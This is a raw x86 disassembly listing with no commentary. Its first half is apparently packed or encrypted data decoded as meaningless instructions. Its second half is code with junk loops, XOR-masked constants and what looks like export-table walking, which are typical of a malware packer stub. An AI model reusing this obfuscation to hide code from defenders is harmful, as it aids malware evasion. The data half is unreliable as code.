  40581a:	mov    eax,0x87ef9fc0
  40581f:	inc    edx
  405820:	xchg   ebp,eax
  405821:	sbb    DWORD PTR [ecx+0x4f],0x2a
  405825:	add    bl,BYTE PTR [ebx-0x7ca5c4cf]
  40582b:	mov    edx,0x8a1788a2
  405830:	(bad)  [ebp+edi*4-0x4b]
  405834:	loop   0x4057d9
  405836:	sti    
  405837:	repnz sbb dl,BYTE PTR [eax+0x6511c59c]
  40583e:	getsec 
  405840:	pop    esp
  405841:	enter  0x198f,0xfe
  405845:	sub    al,BYTE PTR [edx-0x4eae9f5]
  40584b:	lods   al,BYTE PTR ds:[esi]
  40584c:	ret    0xb500
  40584f:	(bad)  
  405850:	xor    edi,0x2
  405853:	xor    al,0x2
  405855:	in     al,0xac
  405857:	loop   0x4057de
  405859:	xchg   ah,bh
  40585b:	jb     0x40580c
  40585d:	mov    edi,0x20a01c8b
  405862:	dec    esi
  405863:	hlt    
  405864:	mov    dh,0x9d
  405866:	retf   0x336d
  405869:	push   ebp
  40586a:	in     al,dx
  40586b:	es push esi
  40586d:	xchg   ecx,eax
  40586e:	pop    esp
  40586f:	push   ecx
  405870:	jns    0x4058a1
  405872:	das    
  405873:	in     al,0xf1
  405875:	sbb    esi,DWORD PTR [eax-0xf5ae22]
  40587b:	lods   al,BYTE PTR ds:[esi]
  40587c:	or     cl,ah
  40587e:	test   eax,0x193507d5
  405883:	arpl   WORD PTR [edi+0x603e871a],bx
  405889:	add    al,0xe0
  40588b:	scas   al,BYTE PTR es:[edi]
  40588c:	mov    ecx,0x3f3d8001
  405891:	add    edi,edi
  405893:	(bad)  
  405894:	cmp    ebx,esp
  405896:	repz fimul WORD PTR [ecx+0x263398a4]
  40589d:	mov    bh,BYTE PTR [ebp-0x436c4dcf]
  4058a3:	push   eax
  4058a4:	ja     0x40588c
  4058a6:	inc    ebp
  4058a7:	cmp    bl,BYTE PTR [ecx+0x59a0f330]
  4058ad:	add    eax,0xaa875627
  4058b2:	imul   BYTE PTR [esi+0x67dfb7d1]
  4058b8:	stos   BYTE PTR es:[edi],al
  4058b9:	sbb    DWORD PTR [ebp+0x24673e81],ecx
  4058bf:	add    DWORD PTR [esp+ecx*8],edi
  4058c2:	jecxz  0x40590a
  4058c4:	mov    BYTE PTR [ecx+0x21],dh
  4058c7:	or     DWORD PTR [edx+esi*8+0x77a39be7],eax
  4058ce:	test   al,0x73
  4058d0:	lock sub DWORD PTR [ebp+0x4d],edi
  4058d4:	jge    0x405873
  4058d6:	sbb    ecx,DWORD PTR [eax+0xb4e4135]
  4058dc:	dec    edx
  4058dd:	stos   DWORD PTR es:[edi],eax
  4058de:	inc    ebx
  4058df:	sbb    al,0x7b
  4058e1:	cmp    edi,DWORD PTR [edi]
  4058e3:	pop    edx
  4058e4:	jmp    0xd00c:0xe2d0f9ee
  4058eb:	pop    edx
  4058ec:	in     eax,0x2a
  4058ee:	pop    ebx
  4058ef:	pushf  
  4058f0:	push   ss
  4058f1:	retf   0xc9ff
  4058f4:	jmp    0x65ad6c0a
  4058f9:	enter  0xd618,0x34
  4058fd:	shl    DWORD PTR [eax+0x16],cl
  405900:	add    BYTE PTR [ebx],dh
  405902:	dec    edi
  405903:	(bad)  [edx+0x1911bed5]
  405909:	xchg   edx,eax
  40590a:	loope  0x405940
  40590c:	dec    edi
  40590d:	retf   
  40590e:	mov    eax,ds:0x5e48bd1f
  405913:	(bad)  [ebp-0x33cee3ce]
  405919:	jp     0x405946
  40591b:	sbb    BYTE PTR fs:[ebp-0x42aa6ced],0x4e
  405923:	adc    edi,DWORD PTR [ecx]
  405925:	or     al,0x62
  405927:	ins    DWORD PTR es:[edi],dx
  405928:	arpl   WORD PTR [edx+ebp*2],bp
  40592b:	xchg   esi,eax
  40592c:	ss ja  0x4058db
  40592f:	shl    BYTE PTR [edx],0xa5
  405932:	dec    edi
  405933:	fs pop eax
  405935:	fwait
  405936:	mov    BYTE PTR [edx+0x5d],bl
  405939:	mov    ebx,ecx
  40593b:	cmp    ebx,DWORD PTR [esi-0x7ebc7713]
  405941:	lock ss xchg ebx,eax
  405944:	mov    ebp,0x778c5de0
  405949:	ret    0x1f52
  40594c:	(bad)  
  40594d:	fdivr  QWORD PTR ds:0x6f02c1a7
  405953:	or     BYTE PTR [esi],0xde
  405956:	inc    esp
  405957:	dec    edx
  405958:	ins    BYTE PTR es:[edi],dx
  405959:	push   ecx
  40595a:	ss jnp 0x405955
  40595d:	outs   dx,DWORD PTR ds:[esi]
  40595e:	sub    DWORD PTR [eax-0x2b2cf03a],esi
  405964:	jge    0x40593b
  405966:	pushf  
  405967:	jmp    0x93039b0d
  40596c:	sbb    DWORD PTR [edx*8+0x585ea227],edx
  405973:	mov    dl,0xa6
  405975:	push   ds
  405976:	imul   ebp,DWORD PTR [edi+0x7c],0x842e7598
  40597d:	nop
  40597e:	into   
  40597f:	mov    bl,0x38
  405981:	ror    DWORD PTR [ecx-0x4a],1
  405984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405986:	pop    DWORD PTR [eax+0x63e49dcb]
  40598c:	test   BYTE PTR [ebp-0x53cc36ed],bl
  405992:	cmp    bh,al
  405994:	stos   BYTE PTR es:[edi],al
  405995:	xlat   BYTE PTR ds:[ebx]
  405996:	data16 sbb BYTE PTR [ebx+0x2a],bl
  40599a:	dec    esi
  40599b:	jp     0x4059c7
  40599d:	or     eax,0xd95d35cf
  4059a2:	lea    ebp,[eax+0x7]
  4059a5:	fwait
  4059a6:	push   ebx
  4059a7:	fmulp  st(6),st
  4059a9:	loopne 0x40598c
  4059ab:	ficom  DWORD PTR [eax-0x9]
  4059ae:	cmp    eax,0xfe728060
  4059b3:	jmp    DWORD PTR [ecx]
  4059b5:	pop    eax
  4059b6:	xor    BYTE PTR [eax-0x4a81f861],bl
  4059bc:	cld    
  4059bd:	pop    es
  4059be:	scas   al,BYTE PTR es:[edi]
  4059bf:	cwde   
  4059c0:	ret    
  4059c1:	mov    edi,0x9abee817
  4059c6:	in     al,0xc0
  4059c8:	ficomp DWORD PTR [ecx+esi*8-0x25]
  4059cc:	jbe    0x4059b0
  4059ce:	sub    al,0xeb
  4059d0:	arpl   WORD PTR [ebx],ax
  4059d2:	and    ecx,DWORD PTR [ecx-0x75]
  4059d5:	mov    esp,0x4c5933e0
  4059da:	inc    ebp
  4059db:	gs das 
  4059dd:	fbld   TBYTE PTR [esp+ecx*2-0x59]
  4059e1:	mov    ds:0x9aebfe70,eax
  4059e6:	fld    TBYTE PTR [esi+eiz*8+0x3d]
  4059ea:	mov    ebp,DWORD PTR [ebp+0x22a5ed7f]
  4059f0:	fsub   DWORD PTR [eax+0xa]
  4059f3:	jmp    0xe697a468
  4059f8:	jecxz  0x405993
  4059fa:	dec    edx
  4059fb:	xor    eax,0xdf058e83
  405a00:	retf   0x73d5
  405a03:	jnp    0x40598f
  405a05:	outs   dx,DWORD PTR ds:[esi]
  405a06:	jecxz  0x405a78
  405a08:	cmp    al,0xc1
  405a0a:	adc    ebx,DWORD PTR [ebp+0x462f435c]
  405a10:	push   edi
  405a11:	pushf  
  405a12:	pop    ss
  405a13:	push   ebp
  405a14:	pop    edx
  405a15:	sbb    al,0x4e
  405a17:	mov    dh,0xd
  405a19:	int3   
  405a1a:	repz pop esp
  405a1c:	mov    ds:0x566a48c1,eax
  405a21:	shl    cl,1
  405a23:	outs   dx,BYTE PTR ds:[esi]
  405a24:	sub    ebp,ecx
  405a26:	(bad)  
  405a27:	out    0x84,al
  405a29:	adc    DWORD PTR [ebp+0x66bcf259],esi
  405a2f:	cmp    edx,ebp
  405a31:	jmp    0x91b:0x7cffd852
  405a38:	in     eax,dx
  405a39:	fsubp  st(7),st
  405a3b:	pushf  
  405a3c:	shl    BYTE PTR [ecx+0x122f598f],1
  405a42:	adc    ecx,DWORD PTR [ecx+esi*1+0x2f]
  405a46:	mov    BYTE PTR [edx-0x5580e19f],dh
  405a4c:	fisubr WORD PTR [esi-0x60121425]
  405a52:	in     al,dx
  405a53:	ss mov ah,0x2b
  405a56:	mov    al,ds:0x7e7e045f
  405a5b:	stos   DWORD PTR es:[edi],eax
  405a5c:	jne    0x405ad9
  405a5e:	inc    eax
  405a5f:	sar    DWORD PTR [ecx-0x479e6cce],1
  405a65:	push   ebp
  405a66:	sbb    ebp,DWORD PTR [ecx+0x6318394d]
  405a6c:	pop    ecx
  405a6d:	push   cs
  405a6e:	push   0xffffffb1
  405a70:	scas   eax,DWORD PTR es:[edi]
  405a71:	dec    ecx
  405a72:	cmp    eax,0x6ea90664
  405a77:	mov    dh,0x4f
  405a79:	xor    DWORD PTR [ebx+eiz*4-0x2c5a512b],0xffffff95
  405a81:	call   0xdfc7:0x2e6ec247
  405a88:	aaa    
  405a89:	dec    ecx
  405a8a:	pop    es
  405a8b:	jb     0x405a1b
  405a8d:	mov    cl,0xfc
  405a8f:	repnz sub DWORD PTR [edx+0x5d],eax
  405a93:	gs pop ds
  405a95:	call   0xee2c30a5
  405a9a:	xchg   esp,eax
  405a9b:	stos   DWORD PTR es:[edi],eax
  405a9c:	hlt    
  405a9d:	and    al,0xe3
  405a9f:	gs jp  0x405aef
  405aa2:	jecxz  0x405a4e
  405aa4:	pop    edi
  405aa5:	sahf   
  405aa6:	jg     0x405a9d
  405aa8:	in     al,0xe4
  405aaa:	inc    edx
  405aab:	arpl   WORD PTR [edi-0x4fa6674a],sp
  405ab1:	push   ss
  405ab2:	pop    edx
  405ab3:	jmp    0x290469d4
  405ab8:	lea    ebp,[edi+0x68f61d04]
  405abe:	lods   eax,DWORD PTR ds:[esi]
  405abf:	outs   dx,BYTE PTR ds:[esi]
  405ac0:	push   ss
  405ac1:	ins    BYTE PTR es:[edi],dx
  405ac2:	out    0x3c,al
  405ac4:	sub    esp,eax
  405ac6:	push   esi
  405ac7:	xchg   edx,eax
  405ac8:	or     eax,DWORD PTR [edi+0x7c]
  405acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405acc:	mov    esp,DWORD PTR [edx+0x1a]
  405acf:	mov    eax,ds:0xbe2c10bf
  405ad4:	aad    0xf6
  405ad6:	das    
  405ad7:	out    0x9e,eax
  405ad9:	xchg   esi,eax
  405ada:	sub    al,al
  405adc:	mov    esp,ss
  405ade:	arpl   WORD PTR [esi-0x2894de11],bp
  405ae4:	xor    al,0x46
  405ae6:	leave  
  405ae7:	pop    ebx
  405ae8:	add    ebp,DWORD PTR [eax-0x10]
  405aeb:	dec    esi
  405aec:	or     eax,0x86570026
  405af1:	sub    cl,BYTE PTR [ebx]
  405af3:	test   DWORD PTR [eax+0x71],edx
  405af6:	test   dh,0xe0
  405af9:	jp     0x405ab8
  405afb:	inc    ebx
  405afc:	mov    eax,ds:0x5777481d
  405b01:	inc    ecx
  405b02:	adc    eax,0x11813cc3
  405b07:	je     0x405ad0
  405b09:	push   eax
  405b0a:	pop    ss
  405b0b:	pop    ss
  405b0c:	retf   0x7a6a
  405b0f:	sar    DWORD PTR [ecx+0x595f5a8f],0xe6
  405b16:	mov    al,ds:0x2f42443
  405b1b:	inc    esi
  405b1c:	cmp    bl,BYTE PTR [edi-0xe9fc19c]
  405b22:	ins    BYTE PTR es:[edi],dx
  405b23:	(bad)  
  405b24:	adc    bh,BYTE PTR [esi+0x2e2a8bc6]
  405b2a:	cdq    
  405b2b:	(bad)  
  405b2d:	push   ss
  405b2e:	adc    dl,BYTE PTR [edi+0x69]
  405b31:	inc    esp
  405b32:	push   ebp
  405b33:	adc    DWORD PTR [ebp-0x1a9105df],0x63
  405b3a:	nop
  405b3b:	sbb    eax,0xd0109074
  405b40:	fild   QWORD PTR [eax]
  405b42:	retf   
  405b43:	sbb    dh,BYTE PTR ds:0xcf59f073
  405b49:	pop    ss
  405b4a:	ins    DWORD PTR es:[edi],dx
  405b4b:	pop    ebx
  405b4c:	push   cs
  405b4d:	adc    al,0x66
  405b4f:	frstor [edx+0x173e1f82]
  405b55:	aad    0xa5
  405b57:	cwde   
  405b58:	aas    
  405b59:	jo     0x405bce
  405b5b:	dec    edx
  405b5c:	mov    BYTE PTR [ecx-0x32eddad7],bl
  405b62:	or     eax,0xe63fe99e
  405b67:	not    DWORD PTR [ecx]
  405b69:	shl    DWORD PTR [ebx-0xd8152f1],1
  405b6f:	shl    BYTE PTR [bx+si],1
  405b72:	not    ch
  405b74:	xor    cl,BYTE PTR [edx-0x19]
  405b77:	xor    cl,dh
  405b79:	push   ebx
  405b7a:	inc    esi
  405b7b:	ror    BYTE PTR [esi+0x2c],cl
  405b7e:	pop    ebx
  405b7f:	popa   
  405b80:	js     0x405bee
  405b82:	or     ch,bh
  405b84:	or     al,0x22
  405b86:	jnp    0x405bc9
  405b88:	jne    0x405be9
  405b8a:	adc    dh,BYTE PTR [edx+ebp*1+0x7b]
  405b8e:	pop    es
  405b8f:	jb     0x405b88
  405b91:	xor    al,0x81
  405b93:	in     al,dx
  405b94:	test   eax,0x6ce06bee
  405b99:	(bad)  
  405b9b:	outs   dx,BYTE PTR ds:[esi]
  405b9c:	fisttp QWORD PTR ds:0x96dd91c7
  405ba2:	add    DWORD PTR [esi+0x46],eax
  405ba5:	mov    al,ds:0x191d1906
  405baa:	push   0x52
  405bac:	mov    dh,0x68
  405bae:	mov    es,WORD PTR [ecx+0x67]
  405bb1:	push   esi
  405bb2:	mov    al,ds:0x11d0ce31
  405bb7:	push   0x2c44cbe3
  405bbc:	outs   dx,DWORD PTR ds:[esi]
  405bbd:	ss (bad) 
  405bc0:	rol    BYTE PTR [esi],cl
  405bc2:	ficom  WORD PTR [edx-0x3d83be65]
  405bc8:	and    esi,ebp
  405bca:	mov    al,ds:0x79b55d07
  405bcf:	jp     0x405bb8
  405bd1:	xchg   esi,eax
  405bd2:	sti    
  405bd3:	pop    edx
  405bd4:	in     al,dx
  405bd5:	sbb    ecx,ebp
  405bd7:	aam    0x36
  405bd9:	fucom  st(6)
  405bdb:	pop    ebp
  405bdc:	std    
  405bdd:	popa   
  405bde:	fbstp  TBYTE PTR gs:[ebp-0xa]
  405be2:	pop    ebx
  405be3:	mov    dh,0xf5
  405be5:	repz sahf 
  405be7:	xchg   ebp,eax
  405be8:	mov    ds:0xa5731dce,al
  405bed:	ja     0x405bcb
  405bef:	pusha  
  405bf0:	inc    edi
  405bf1:	inc    ebx
  405bf2:	lock xchg ecx,eax
  405bf4:	jecxz  0x405c10
  405bf6:	add    eax,0x7626e524
  405bfb:	mov    esi,0xe302f3dd
  405c00:	in     al,dx
  405c01:	push   ss
  405c02:	cld    
  405c03:	inc    esi
  405c04:	push   edx
  405c05:	outs   dx,DWORD PTR ds:[esi]
  405c06:	call   0x82bc1682
  405c0b:	popa   
  405c0c:	adc    BYTE PTR [ecx+0x6a],al
  405c0f:	jne    0x405bce
  405c11:	mov    cl,0x42
  405c13:	add    ah,ch
  405c15:	and    eax,0xe0878253
  405c1a:	scas   eax,DWORD PTR es:[edi]
  405c1b:	stc    
  405c1c:	adc    BYTE PTR [esi],ah
  405c1e:	(bad)  
  405c1f:	call   0x1e6e5f0
  405c24:	mov    fs,WORD PTR [ebp+0x6e51b16e]
  405c2a:	lods   eax,DWORD PTR ds:[esi]
  405c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c2c:	pop    ds
  405c2d:	dec    esp
  405c2e:	push   eax
  405c2f:	retf   
  405c30:	jp     0x405ca2
  405c32:	and    BYTE PTR ds:0x96a59301,ah
  405c38:	sbb    DWORD PTR [eax+0x1c],esp
  405c3b:	cmp    ebx,DWORD PTR [esi+ecx*2-0x14]
  405c3f:	ss push edi
  405c41:	adc    ch,BYTE PTR [edx+edi*8-0x4d]
  405c45:	sti    
  405c46:	add    BYTE PTR [edi],ch
  405c48:	push   ds
  405c49:	pop    es
  405c4a:	mov    eax,ds:0x421ae2
  405c4f:	push   DWORD PTR [eax]
  405c51:	push   DWORD PTR ds:0x421d3e
  405c57:	push   DWORD PTR ds:0x421aea
  405c5d:	push   DWORD PTR ds:0x421d1e
  405c63:	push   DWORD PTR ds:0x421db2
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421ce2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423847
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x423806
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423a72
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x423992
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
